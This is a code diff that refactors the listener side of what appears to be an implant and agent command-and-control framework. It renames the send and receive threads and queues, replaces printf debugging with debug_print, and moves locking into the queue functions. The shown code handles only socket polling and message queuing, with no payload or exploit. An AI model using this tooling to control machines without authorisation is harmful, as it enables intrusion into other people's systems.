@@ -15,6 +15,7 @@ This function will send and receive buffers to the agents.
 
 #include <sys/socket.h>
 
+#include "utility.h"
 #include "queue.h"
 #include "implant.h"
 #include "base.h"
@@ -22,20 +23,20 @@ This function will send and receive buffers to the agents.
 
 // Global variables
 // Socket Poll Structure
-extern struct implant_poll* poll_struct;
+extern implant_poll* poll_struct;
 extern pthread_mutex_t poll_lock;
 // Receive Queue
-extern struct Queue* receive_queue;
-extern pthread_mutex_t receive_queue_lock;
+extern Queue* listener_receive_queue;
+extern pthread_mutex_t listener_receive_queue_lock;
 // Send Queue
-extern struct Queue* send_queue;
-extern pthread_mutex_t send_queue_lock;
+extern Queue* listener_send_queue;
+extern pthread_mutex_t listener_send_queue_lock;
 
 bool check_alive(){
 	return true;
 }
 
-void *agent_receive(void *vargp){
+void *receive_from_agent(void *vargp){
 	Fragment fragment;
 	char* buffer;
 	
@@ -49,14 +50,14 @@ void *agent_receive(void *vargp){
 			
 			// check if ready to read
 			if (pfds[i].revents & POLLIN){
-//				printf("DEBUG POLLIN  %d\n", pfds[i].fd);
+				debug_print("POLLIN  %d\n", pfds[i].fd);
 				int nbytes = recv(pfds[i].fd, (void*)&fragment, sizeof(Fragment), 0);
 				
-				printf("DEBUG received fragment:\ttype: %d, index: %d, size: %d\n", fragment.type, fragment.index, nbytes);
+				debug_print("received fragment:\ttype: %d, index: %d, size: %d\n", fragment.type, fragment.index, nbytes);
 				
 				// close file descriptor and remove from poll array
 				if (nbytes == 0){
-					printf("INFO connection closed\n");
+					debug_print("%s\n", "connection closed");
 					poll_delete(i);
 				}
 				else if (nbytes == -1){
@@ -71,10 +72,8 @@ void *agent_receive(void *vargp){
 					memset(message->fragment, 0, nbytes);
 					memcpy(message->fragment, &fragment, nbytes);
 					
-					pthread_mutex_lock(&receive_queue_lock);
-					printf("DEBUG adding message to queue:\tid: %d, fragment_size: %d\n", message->id, message->fragment_size);
-					enqueue(receive_queue, message);
-					pthread_mutex_unlock(&receive_queue_lock);
+					debug_print("adding message to queue:\tid: %d, fragment_size: %d\n", message->id, message->fragment_size);
+					enqueue(listener_receive_queue, &listener_receive_queue_lock, message);
 				}
 			}
 		}
@@ -83,19 +82,14 @@ void *agent_receive(void *vargp){
     return 0;
 }
 
-void *agent_send(void *vargp){
+void *send_to_agent(void *vargp){
 	Queue_Message* message;
 	
 //	int *fd_count = poll_struct->fd_count;
 //	struct pollfd *pfds = poll_struct->pfds;
 	
-	for(;;){
-		if (isEmpty(receive_queue))
-			continue;
-		
-		pthread_mutex_lock(&send_queue_lock);
-		message = dequeue(send_queue);
-		pthread_mutex_unlock(&send_queue_lock);
+	for(;;){	
+		if (!(message = dequeue(listener_send_queue, &listener_send_queue_lock))) continue;
 		
 		int nbytes = send(message->id, message->fragment, message->fragment_size, 0);
 		if (nbytes != message->fragment_size){
